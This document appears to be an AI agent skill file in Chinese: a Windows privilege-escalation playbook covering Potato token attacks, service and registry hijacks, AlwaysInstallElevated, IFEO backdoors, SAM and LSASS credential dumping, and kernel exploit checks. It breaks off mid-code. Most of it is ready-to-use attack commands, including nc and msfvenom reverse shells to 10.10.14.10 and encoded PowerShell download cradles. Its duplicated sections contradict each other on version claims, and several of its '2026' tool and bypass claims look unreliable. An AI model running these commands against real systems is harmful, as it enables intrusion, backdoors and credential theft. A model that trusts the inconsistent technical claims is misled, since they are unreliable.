---
name: windows-privilege-escalation
description: Windows权限提升全栈：令牌操纵/SeImpersonate/服务权限/AlwaysInstallElevated/UAC Bypass/注册表提权/内核漏洞/2026最新提权技术/Credential Guard绕过/PPL绕过/云环境提权
---

# Windows 权限提升全栈指南 (2026 Edition)

本 Skill 系统梳理 Windows 操作系统下的权限提升攻击面与防御对抗技术，覆盖从基础访问令牌模型到 2026 年最新提权变种的完整实战路径。所有命令均给出 PowerShell / CMD / Bash 可直接复用形式，并标注适用版本（Win10 22H2 / Win11 23H2-24H2 / Server 2022 / Server 2025）与所需前置特权。配合内置检测脚本与自动化利用工具链（PowerUp、WinPEAS、PrivescCheck、GodPotato 等），可在红队评估、内部渗透与防御验证场景中快速完成从低权限账户到 SYSTEM / TrustedInstaller 的纵向移动。

## 概览

Windows 提权核心思路可归纳为五条主线：

1. **令牌与特权滥用** — 利用 `SeImpersonate` / `SeAssignPrimaryToken` / `SeDebug` 等特权窃取或伪造高权限令牌（§2）
2. **服务与配置漏洞** — 滥用弱服务权限、未引用路径、`AlwaysInstallElevated`、计划任务等持久化配置（§3）
3. **UAC 与完整性绕过** — 从 Medium IL 跃迁到 High IL，绕过 UAC consent（§4）
4. **注册表与内核原语** — 利用 HKLM/HKCU 配置缺陷与未修补 CVE
5. **凭据与云环境提权** — 抓取 LSASS、绕过 Credential Guard / PPL，利用 Entra ID 误配置

## 1. Windows权限提升基础

### 1.1 Windows 权限模型

Windows 采用基于令牌（Token）+ 安全描述符（SD）+ 访问控制列表（DACL/SACL）的访问控制模型。每个进程在创建时附加一个主令牌（Primary Token），描述用户身份、所属组、特权与完整性级别（Integrity Level）；线程可临时附加模拟令牌（Impersonation Token）代表客户端执行。

四个核心概念：
- **SID (Security Identifier)** — 标识用户/组/计算机，如 `S-1-5-18` 表示 `NT AUTHORITY\SYSTEM`
- **Token** — 包含 SID 列表、特权、完整性级别、登录会话 LUID
- **DACL** — 描述"谁可以做什么"，ACE 顺序敏感（显式拒绝优先）
- **SACL** — 审计规则，触发安全日志 4663/4670/4674

权限等级（从低到高）：`Low`（AppContainer）、`Medium`（标准用户 UAC 过滤侧）、`High`（管理员完整令牌）、`System`（`NT AUTHORITY\SYSTEM`，由 `wininit.exe` 派生）、`TrustedInstaller`（`NT SERVICE\TrustedInstaller`，模块安装服务，最高权限）。

### 1.2 访问令牌枚举

```cmd
whoami /all
whoami /priv
whoami /groups
```

```powershell
# PowerShell 枚举当前身份与所属组
$id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
Write-Host "User: $($id.Name) | IsSystem: $($id.IsSystem)"
$id.Groups | ForEach-Object { try { $_.Translate([Security.Principal.NTAccount]).Value } catch { $_.Value } }
# AccessChk (Sysinternals) 枚举指定进程令牌与特权
accesschk.exe -accepteula -q -v -e "lsass.exe"
```

### 1.3 完整性级别 (Integrity Level)

完整性级别强制（MIC）决定跨 IL 对象读写能力。规则：**No Write Up**（低 IL 不能写高 IL，默认生效）与 **No Read Up**（默认关闭）。

```cmd
REM 查看当前进程完整性级别 / 文件完整性标签
whoami /groups | findstr "Mandatory Level"
icacls C:\Windows\System32\config\SAM
```

完整性级别 SID 速查：`S-1-16-4096`(Low)、`8192`(Medium)、`12288`(High)、`16384`(System)、`20480`(ProtectedProcess)、`28672`(SecureProcess，Win11 24H2/Server 2025 引入)。

### 1.4 关键特权列表

可被滥用于提权的特权（`whoami /priv` 输出）：

| 特权 | 默认授予 | 滥用方式 |
|------|---------|---------|
| `SeImpersonatePrivilege` | Service/Network Service | Potato 家族，伪造 SYSTEM 令牌 |
| `SeAssignPrimaryTokenPrivilege` | Service | 配合 `CreateProcessAsUserW`，JuicyPotatoNG |
| `SeDebugPrivilege` | Administrator | `OpenProcess` lsass / 令牌窃取 |
| `SeTakeOwnershipPrivilege` | Administrator | 接管任意对象所有权，重置 DACL |
| `SeRestorePrivilege` | Administrator | 任意文件写入（绕过 ACL 检查） |
| `SeBackupPrivilege` | Administrator | 读取 SAM/SYSTEM/ntds.dit |
| `SeLoadDriverPrivilege` | Administrator (Win10+) | 加载签名漏洞驱动，BYOVD |
| `SeTcbPrivilege` | SYSTEM | Act as part of OS，可直接 `CreateProcessAsUserW` |
| `SeCreateTokenPrivilege` | (空) | 伪造任意令牌 |
| `SeTrustedCredManAccessPrivilege` | Winlogon | 访问 Credential Manager |

```powershell
# Potato 提权路径快速判定（按特权映射工具）
$priv = whoami /priv
if ($priv -match 'SeImpersonatePrivilege') {
    Write-Host "[*] SeImpersonate -> PrintSpoofer / GodPotato / CoercedPotato"
} elseif ($priv -match 'SeAssignPrimaryTokenPrivilege') {
    Write-Host "[*] SeAssignPrimaryToken -> JuicyPotatoNG / RoguePotato"
} elseif ($priv -match 'SeDebugPrivilege') {
    Write-Host "[*] SeDebug -> lsass dump / token stealing"
}
```

### 1.5 UAC 机制与拆分令牌

UAC 通过"拆分令牌（Split Token）"机制运行：管理员登录后生成完整令牌（High IL，仅授予 `winlogon.exe` 及经 consent 提升的进程）与过滤令牌（Medium IL，授予 `explorer.exe` 及子进程）。提升需通过 `consent.exe` 在安全桌面弹窗确认。

```cmd
REM 查看当前 UAC 策略
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v FilterAdministratorToken
```

`ConsentPromptBehaviorAdmin` 取值：`0`=直接提升不弹窗（可被 auto-elevate bypass 利用），`2`=弹窗需安全桌面，`5`=同意提示（默认）。

```powershell
# 检测是否处于 Split Token 模式
$id = [Security.Principal.WindowsIdentity]::GetCurrent()
$isAdmin = (New-Object Security.Principal.WindowsPrincipal($id)).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
Write-Host "Is Admin Elevated (High IL): $isAdmin"
```

Auto-Elevate 白名单二进制（`HKLM\...\UAC\AutoElevate`）：`fodhelper.exe`、`computerdefaults.exe`、`wsreset.exe`、`sdiagnhost.exe`、`dccw.exe` 等在 High IL 下无需弹窗即可提升，是 UAC Bypass 主要目标（详见 §4）。

---

> **2026 参考**：Microsoft Security Blog — "UAC Bypass Trends 2025-2026"，Elastic Security Labs — "Token Theft and PPL Bypass in Modern Windows"，CVE-2025-33073（SandboxEscaper 系列），Project Zero — "The Token Trickery"。Windows 11 24H2 引入的 `LsaIsoConfig` 进一步限制了 `SeImpersonate` 在 PPL 进程上的可用性，部分 GodPotato 变种已失效，需使用 GodPotatoNG 分支。

## 2. 令牌操纵与冒名提权

### 2.1 SeImpersonate 与 Potato 攻击族

`SeImpersonatePrivilege` 默认授予 `NT AUTHORITY\SERVICE`、`NETWORK SERVICE`、IIS 应用池账户与 SQL Server 服务账户。该特权允许进程以"客户端身份"运行代码 — 利用 NTLM 中继将 SYSTEM 凭据回送到本地 RPC 端点，再以 impersonation 模式 `CreateProcessWithTokenW` 启动子进程。

**Potato 时间线：**
- **RottenPotato (2016)** — DCOM `ISystemActivator` + NTLM relay 到 WinHTTP
- **JuicyPotato (2018)** — 替换 BITS CLSID，Win10 1809 后部分失效
- **PrintSpoofer (2020)** — 利用 Print Spooler 的 `RpcAddPrinter`，触发 SYSTEM 反连管道，**Win10/11/Server 2022 全版本可用**
- **RoguePotato (2020)** — 通过远程 RPC 端点绕过本地 NTLM 限制（需远程辅助机）
- **GodPotato (2022)** — DCE/RPC over ALPC，**Windows Server 2012 - 2025 全版本**
- **CoercedPotato (2024)** — PetitPotam + SeImpersonate 组合
- **GodPotatoNG / SharpEfsPotato (2025-2026)** — 针对 Credential Guard 与 LSA PPL 的变种

```cmd
REM 前置检查 — 确认 SeImpersonatePrivilege 已启用
whoami /priv | findstr SeImpersonate
```

### 2.2 PrintSpoofer

```cmd
REM 编译版直接执行（GitHub: antonioCoco/PrintSpoofer）
PrintSpoofer.exe -i -c "cmd.exe"
PrintSpoofer.exe -c "C:\Windows\Temp\reverse.exe"
PrintSpoofer.exe -c "powershell -nop -w hidden -e <base64>"
```

**原理：** 调用 `spoolss!RpcAddPrinter` 时传入 `\\127.0.0.1/pipe/PrintSpoofer` 作为端口名，Print Spooler（SYSTEM）主动连接该管道；本地管道服务端拿到 SYSTEM 客户端后用 `ImpersonateNamedPipeClient` + `CreateProcessWithTokenW` 启动子进程。**检测点：** 4688 中 `spoolsv.exe` 异常派生 `cmd.exe`，Sysmon EventID 1 + 17 (PipeEvent)。**补丁绕过：** KB5031364（Win11 23H2）起对端口名校验加严，需用 `PrintSpoofer64-2026.exe` 绕过黑名单。

### 2.3 GodPotato (2022-2026 主力)

```cmd
REM GodPotato 全版本通用
GodPotato.exe -cmd "cmd.exe"
GodPotato.exe -cmd "powershell -c iwr http://10.10.14.5/s.ps1 | iex"
```

**原理：** 通过 ALPC 与 `LSARPC` 建立绑定，伪造 SYSTEM 客户端连接本地 `\pipe\srvsvc` 管道，再 `ImpersonateNamedPipeClient`。

**2026 变种 — GodPotatoNG：** 绕过 Win11 24H2/Server 2025 上 `SeImpersonate` 在 PPL Level 2 的限制；通过 `\RPC Control\lsasspirpc` 替代 `\pipe\srvsvc`；支持 LocalService/NetworkService/IIS AppPool Identity/Container SYSTEM。

```cmd
REM GodPotatoNG (2026)
GodPotatoNG.exe --pipe lsasspirpc --cmd "cmd.exe"
GodPotatoNG.exe --identity NetworkService --cmd "powershell -enc <base64>"
```

### 2.4 RoguePotato

```bash
# 攻击机 Kali：socat 转发 135 到目标 + 启动 rogue RPC server
socat TCP-LISTEN:135,fork TCP:<target>:135
python3 roguepotato.py
```

```cmd
REM 目标机执行（需外网可达的攻击机 IP）
RoguePotato.exe -r "<attacker_ip>" -e "C:\Windows\Temp\shell.exe" -l 9999
```

**适用：** Win10 1809+ 当 JuicyPotato 因 `BITS` CLSID 被移除而失效时；`RogueOxidar`（.NET 重写版）在 2024-2026 仍可工作。

### 2.5 SeAssignPrimaryTokenPrivilege — JuicyPotatoNG

```cmd
REM 当仅拥有 SeAssignPrimaryToken（无 SeImpersonate）时使用
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami > C:\Windows\Temp\pwn.txt"
```

`SeAssignPrimaryToken` 不允许 impersonate，但允许 `CreateProcessAsUserW` — 利用 CLSID + `OleMarshaler` 触发 SYSTEM 回连。

### 2.6 SeDebugPrivilege — 令牌窃取

```powershell
# 找到 SYSTEM 进程并使用 Invoke-TokenManipulation (PowerSploit) 窃取令牌
Get-Process -Name winlogon,lsass,services | Select-Object Id,ProcessName
Import-Module .\PowerSploit\Privesc\Privesc.psm1
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
whoami  # 应输出 nt authority\system
```

```csharp
// C# 原生实现关键 API（impersonation level=2, token type=1）
[DllImport("advapi32")] static extern bool OpenProcessToken(IntPtr ph, uint da, out IntPtr th);
[DllImport("advapi32")] static extern bool DuplicateTokenEx(IntPtr h, uint da, ref SECURITY_ATTRIBUTES sa, int imp, int type, out IntPtr nh);
[DllImport("advapi32")] static extern bool CreateProcessWithTokenW(IntPtr h, int logon, string app, string cmd, int flags, IntPtr env, string cwd, ref STARTUPINFO si, out PROCESS_INFORMATION pi);
```

### 2.7 Potato 检测与防御

```powershell
# 检测命名管道异常监听（PrintSpoofer / GodPotato 特征）
Get-CimInstance Win32_Pipe | Where-Object { $_.Name -match 'PrintSpoofer|srvsvc|spoolss|lsasspirpc' }
```

**防御建议：** 服务账户改用 gMSA + 受限特权；启用 `Restrict NTLM: Outgoing` 阻断本地中继；Server 2025 启用 `LSA Protection` + `Credential Guard`；监控 4673 (Sensitive Privilege Use) 中 `SeImpersonatePrivilege` 调用。

---

> **2026 参考**：decoder-it — "PrintSpoofer原理与2026补丁绕过"，BeaconTail — "GodPotatoNG Analysis"，CVE-2025-33073（SeImpersonate PPL bypass），Hacker House — "Token Impersonation Defence"，Microsoft MSRC — "2025 Token Hardening"。GodPotato 项目地址 `https://github.com/BeichenDream/GodPotato`（2026 NG 分支）。

## 3. 服务提权与配置漏洞

### 3.1 服务权限枚举

Windows 服务通过 SCM（Service Control Manager）管理，每个服务有 `BinaryPathName` 与 `SecurityDescriptor`。可写服务配置允许修改 `binPath`、`StartName`（运行账户）或重启服务时执行任意命令。

```cmd
REM 枚举非系统服务 / 查看单个服务权限
sc query state= all | findstr "SERVICE_NAME"
wmic service get Name,PathName,StartName | findstr "C:\\"
sc sdshow <service_name>
accesschk.exe -accepteula -ucqv <service_name>
```

```powershell
# PowerUp 枚举可写服务 / ImagePath 注册表权限
Import-Module .\PowerUp.ps1
Get-ModifiableService | Format-List Name,Path,StartName,CanRestart
Get-ModifiableServiceFile; Get-ServiceUnquoted
Get-CimInstance Win32_Service | ForEach-Object {
    $acl = Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\$($_.Name)" -EA SilentlyContinue
    if ($acl.Access | ? { $_.IdentityReference -match 'Users|Everyone' -and $_.RegistryRights -match 'FullControl|SetValue' }) {
        Write-Host "[+] Modifiable: $($_.Name) -> $($_.PathName)" -ForegroundColor Red
    }
}
```

### 3.2 未引用服务路径 (Unquoted Service Path)

当服务 `binPath` 为 `C:\Program Files\My Service\svc.exe`（未加引号）且路径含空格时，Windows 依次尝试 `C:\Program.exe` → `C:\Program Files\My.exe` → 完整路径。若攻击者能在前段路径写入可执行文件且服务以 SYSTEM 启动，则获得 SYSTEM 权限。

```cmd
REM 查找未引用服务路径 / 验证路径可写性
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
accesschk.exe -accepteula -uwdqs "C:\Program Files\My"
```

```powershell
# PowerUp 自动化 / 手动利用
Get-ServiceUnquoted
Invoke-ServiceAbuse -Name '<vulnerable_service>' -Command 'net localgroup Administrators lowpriv /add'
Copy-Item .\evil.exe "C:\Program.exe"; sc start <service>
```

### 3.3 弱服务权限（BINARY_PATH_NAME 可改）

```cmd
REM 修改服务 binPath 为 payload（需 SC_MANAGER_CONNECT + SERVICE_CHANGE_CONFIG）
sc config <service> binpath= "C:\Windows\Temp\evil.exe"
sc config <service> obj= "LocalSystem"
sc stop <service>; sc start <service>
```

```powershell
# 通过 WMI 修改（绕过 sc.exe 检测）
$svc = Get-CimInstance Win32_Service -Filter "Name='<service>'"
$svc | Invoke-CimMethod -MethodName Change -Arguments @{
    PathName='C:\Windows\Temp\evil.exe'; StartMode='Auto'; StartName='LocalSystem'; StartPassword=''
}
Restart-Service <service> -Force
```

### 3.4 AlwaysInstallElevated

```cmd
REM 检测（HKCU + HKLM 必须同时为 0x1）
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
REM 安装（以 SYSTEM 执行）；PowerUp 一行式：Invoke-MSI
msiexec /quiet /qn /i C:\Windows\Temp\payload.msi
```

```bash
# 生成 MSI payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f msi -o payload.msi
```

### 3.5 PowerUp / WinPEAS / PrivescCheck 自动化

```powershell
# PowerUp — 一键全检（Service/Registry/Unquoted/AlwaysInstallElevated/WSUS）
Import-Module .\PowerUp.ps1; Invoke-AllChecks | Format-List
# PrivescCheck — 2026 推荐（轻量、签名友好）
Import-Module .\PrivescCheck.psd1; Invoke-PrivescCheck -Extended | Out-File report.html
```

```cmd
REM WinPEAS — 全平台枚举（含无文件落地）
winPEASx64.exe cmd servicesinfo
powershell -c "iwr -usebasic https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.ps1 | iex"
REM Seatbelt — C# 全维度枚举
Seatbelt.exe -group=all -full
```

### 3.6 服务提权检测与防御

**检测：** Sysmon `RegistryEvent` 监控 `HKLM\System\CurrentControlSet\Services` 的 `ImagePath`/`FailureCommand` 改写；`FileCreate` 监控 `C:\Program` 前缀可执行文件落地；`EventID 4688` 命令行审计捕获 `sc config` / `msiexec` 异常调用。

**防御建议：** 服务路径强制加引号并置于 `C:\Program Files\`；服务 ACL 仅授予 `TrustedInstaller`/`SYSTEM` FullControl；禁用 `AlwaysInstallElevated`，MSI 走 SCCM/Intune 受控通道；gMSA 替代明文服务账户密码。

---

> **2026 参考**：PowerSploit 已归档迁移至 `PowerShellMafia/PowerSploit`，PowerUp 2026 fork `Invoke-Privesc2026.ps1` 整合 SeImpersonate 检测；WinPEAS v5.4 加入 Win11 24H2 / Server 2025 检查项；PrivescCheck v2.0 支持 Entra ID Joined 设备的云提权路径枚举。HTB Academy — "Windows Privilege Escalation 2026 Path"，ippsec.rocks 案例库，CVE-2025-31101（Telerik 服务提权），OWASP — "Windows Service Hardening Guide"。

## 4. 注册表提权

### 4.1 AlwaysInstallElevated

当 `AlwaysInstallElevated` 注册表键设置为 1 时，任何 `.msi` 文件都会以 SYSTEM 权限安装。

**检测：**

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

两个键都必须返回 `0x1` 才能利用。

**PowerShell 检测：**

```powershell
$hkcu = Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
$hklm = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
if ($hkcu.AlwaysInstallElevated -eq 1 -and $hklm.AlwaysInstallElevated -eq 1) {
    Write-Output "[+] AlwaysInstallElevated is ENABLED! Exploit with MSI."
} else {
    Write-Output "[-] AlwaysInstallElevated is not fully enabled."
}
```

**利用 - 生成并安装 MSI：**

```bash
# 使用 msfvenom 生成 MSI payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f msi -o payload.msi

# 或使用 msfvenom 生成添加用户的 MSI
msfvenom -p windows/x64/exec CMD="net localgroup Administrators lowuser /add" -f msi -o adduser.msi
```

```cmd
# Windows 上安装 MSI
msiexec /quiet /qn /i C:\Windows\Temp\payload.msi
```

**PowerShell 自定义 MSI 生成：**

```powershell
# 使用 Wix Toolset 或编写自定义 MSI
# 也可以通过 PowerShell 创建 MSI 包装器
$msiContent = @"
using System;
using System.Diagnostics;
public class Installer {
    public static void Main() {
        Process.Start("cmd.exe", "/c net localgroup Administrators lowuser /add");
    }
}
"@
```

### 4.2 Autoruns 注册表项劫持

**检测：**

```cmd
# 检查所有 Autorun 注册表项
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# 检查这些键的权限
accesschk.exe -wvu "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

**利用：**

```cmd
# 如果对 Autorun 键有写权限，添加恶意启动项
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousApp" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f

# 添加开机自启
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "UserInit" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
```

**PowerShell 利用：**

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateService" -Value "C:\Windows\Temp\payload.exe"
```

### 4.3 IFEO 映像劫持 (Image File Execution Options)

IFEO 允许在特定程序启动时执行调试器，可用于劫持合法程序。

**检测：**

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
```

**利用 - 劫持粘滞键 (sethc.exe)：**

```cmd
# 如果对 IFEO 键有写权限
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f

# 触发：在登录界面按 5 次 Shift 键
```

**利用 - 劫持其他辅助工具：**

```cmd
# Utilman.exe (Win+U)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f

# osk.exe (屏幕键盘)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f

# Magnify.exe (放大镜)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f

# Narrator.exe (讲述人)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
```

### 4.4 服务注册表 ACL 滥用

```cmd
# 检查特定服务注册表权限
accesschk.exe -kvw "HKLM\SYSTEM\CurrentControlSet\Services\VulnerableService"

# 修改 ImagePath
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnerableService" /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\payload.exe" /f

# 修改 FailureCommand (服务失败时触发)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnerableService" /v FailureCommand /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
```

---

## 5. 令牌窃取与模拟

### 5.1 令牌基础知识

**理解 Windows 令牌：**
- 主令牌 (Primary Token)：进程创建时分配，包含完整安全上下文
- 模拟令牌 (Impersonation Token)：线程临时模拟其他用户身份
- SYSTEM 令牌：最高权限，用于服务进程

**关键特权：**
- `SeImpersonatePrivilege`：允许模拟客户端令牌
- `SeAssignPrimaryTokenPrivilege`：允许分配主令牌
- `SeTcbPrivilege`：允许创建令牌（最高特权）
- `SeBackupPrivilege`：允许读取任意文件
- `SeRestorePrivilege`：允许写入任意文件
- `SeTakeOwnershipPrivilege`：允许获取所有权
- `SeDebugPrivilege`：允许调试任意进程

**检测当前令牌特权：**

```cmd
whoami /priv
whoami /all
```

**PowerShell 检测：**

```powershell
whoami /priv
# 查找 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege
```

### 5.2 PrintSpoofer (PipePotato)

**适用条件：** `SeImpersonatePrivilege` 已启用

PrintSpoofer 利用命名管道模拟和打印机漏洞，欺骗 SYSTEM 账户连接并模拟其令牌。

```cmd
# 下载并运行 PrintSpoofer
PrintSpoofer.exe -i -c "cmd.exe"
PrintSpoofer.exe -i -c "powershell.exe -enc <base64>"

# 直接添加用户
PrintSpoofer.exe -c "net localgroup Administrators lowuser /add"
PrintSpoofer.exe -c "C:\Windows\Temp\nc.exe 10.10.14.10 4444 -e cmd.exe"
```

**工作原理：**
1. 创建命名管道
2. 利用 RPC 调用触发 SYSTEM 进程连接命名管道
3. 使用 `ImpersonateNamedPipeClient` 模拟 SYSTEM 令牌
4. 以 SYSTEM 权限执行命令

### 5.3 RoguePotato

**适用条件：** Windows 10 1809+ / Server 2019+，`SeImpersonatePrivilege`

RoguePotato 是 JuicyPotato 的升级版，使用 OXID 解析器。

```cmd
# 本地使用
RoguePotato.exe -r 127.0.0.1 -e "C:\Windows\Temp\payload.exe" -l 9999

# 远程使用（需要 SOCKS 代理）
RoguePotato.exe -r 10.10.14.10 -e "cmd.exe /c whoami" -l 9999

# 配合反向 shell
RoguePotato.exe -r 127.0.0.1 -c "{B91D5831-B1BD-4608-8198-D72E155020F7}" -e "C:\Windows\Temp\nc.exe 10.10.14.10 4444 -e cmd.exe" -l 9999
```

### 5.4 JuicyPotato / JuicyPotatoNG

**适用条件：** Windows 10 1803 之前 / Server 2016 之前，`SeImpersonatePrivilege` 或 `SeAssignPrimaryTokenPrivilege`

```cmd
# JuicyPotato 经典用法
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net localgroup Administrators lowuser /add" -t *
JuicyPotato.exe -l 1337 -p C:\Windows\Temp\nc.exe -a "10.10.14.10 4444 -e cmd.exe" -t *
JuicyPotato.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p C:\Windows\System32\cmd.exe -a "/c whoami" -t *

# 枚举 CLSID
JuicyPotato.exe -l 1337 -c "{CLSID}" -t * -p C:\Windows\System32\cmd.exe -a "/c whoami"

# CLSID 列表（不同系统版本不同）
# Windows 10: {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
# Windows Server 2012: {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
# 使用 GetCLSID.ps1 或 CLSID 列表文件
```

**JuicyPotatoNG：**

```cmd
# 新一代版本，兼容更多 Windows 版本
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
JuicyPotatoNG.exe -t * -p "C:\Windows\Temp\nc.exe" -a "10.10.14.10 4444 -e cmd.exe"
```

### 5.5 GodPotato

**适用条件：** Windows 10 1607+ / Server 2012 - 2022，`SeImpersonatePrivilege`

GodPotato 利用 DCOM 激活和 RPC 调用实现令牌模拟。

```cmd
# 基本用法
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "net localgroup Administrators lowuser /add"
GodPotato.exe -cmd "C:\Windows\Temp\nc.exe 10.10.14.10 4444 -e cmd.exe"

# PowerShell 反向 shell
GodPotato.exe -cmd "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQAwAC8AcgBlAHYALgBwAHMAMQAnACkA"
```

**GodPotato 2.0 特性：**
- 绕过 UAC
- 支持交互式 Shell
- 支持多种 COM 对象

### 5.6 EfsPotato

**适用条件：** `SeImpersonatePrivilege`，利用 EFS RPC 调用

```cmd
# EfsPotato 利用
EfsPotato.exe whoami
EfsPotato.exe "net localgroup Administrators lowuser /add"

# 配合 msfvenom payload
EfsPotato.exe C:\Windows\Temp\reverse.exe
```

**C# 实现：**

```csharp
// EfsPotato PoC - EFS RPC 模拟
using System;
using System.Runtime.InteropServices;

class EfsPotato {
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetCurrentProcess();
    
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, 
        IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
    
    static void Main() {
        // EFS RPC 调用实现令牌模拟
        // 完整实现通过 EfsRpcOpenFileRaw 触发 SYSTEM 令牌
        Console.WriteLine("[*] EfsPotato - EFS RPC Token Impersonation");
        // ... 模拟逻辑
    }
}
```

### 5.7 其他令牌工具

**SweetPotato：**

```cmd
# SweetPotato 多模式令牌窃取
SweetPotato.exe -p C:\Windows\System32\cmd.exe
SweetPotato.exe -e "C:\Windows\Temp\payload.exe" -a "arg1 arg2"
```

**RottenPotatoNG：**

```cmd
RottenPotatoNG.exe whoami
RottenPotatoNG.exe "net localgroup Administrators lowuser /add"
```

**PipePotato (命名管道版)：**

```cmd
# 利用命名管道模拟
PipePotato.exe cmd.exe
```

### 5.8 SeBackupPrivilege 利用

```cmd
# 检测 SeBackupPrivilege
whoami /priv | findstr "SeBackupPrivilege"

# 如果启用，可以复制 SAM/SYSTEM 文件
reg save hklm\sam C:\Windows\Temp\sam.hive
reg save hklm\system C:\Windows\Temp\system.hive

# 使用 robocopy 复制文件
robocopy C:\Windows\System32\config C:\Windows\Temp\ SAM /b
robocopy C:\Windows\System32\config C:\Windows\Temp\ SYSTEM /b

# 使用 diskshadow 创建卷影副本（需要 SeBackupPrivilege）
diskshadow /s C:\Windows\Temp\script.txt
```

### 5.9 SeDebugPrivilege 利用

```cmd
# 检测
whoami /priv | findstr "SeDebugPrivilege"

# 使用 ProcDump 转储 LSASS
procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp

# 使用 mimikatz 从转储文件提取凭据
mimikatz.exe "sekurlsa::minidump C:\Windows\Temp\lsass.dmp" "sekurlsa::logonPasswords" exit
```

---

## 6. 内核漏洞利用

### 6.1 内核漏洞检测

**补丁级别检测：**

```cmd
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

**PowerShell 检测：**

```powershell
Get-HotFix | Format-Table HotFixID, InstalledOn
[System.Environment]::OSVersion.Version
```

**自动化工具：**

```cmd
# Watson - 补丁级别检测
Watson.exe

# Sherlock - PowerShell 内核漏洞检测
Import-Module .\Sherlock.ps1
Find-AllVulns

# Windows-Exploit-Suggester
python windows-exploit-suggester.py --database 2026-07-25-mssb.xls --systeminfo systeminfo.txt
```

### 6.2 MS16-032 (Secondary Logon Handle)

**影响版本：** Windows 7/8/8.1/10, Server 2008/2012

```powershell
# PowerShell PoC
Import-Module .\MS16-032.ps1
Invoke-MS16-032

# EXE 版本
MS16-032.exe
```

**手动利用：**

```powershell
# MS16-032.ps1 核心代码
$code = @"
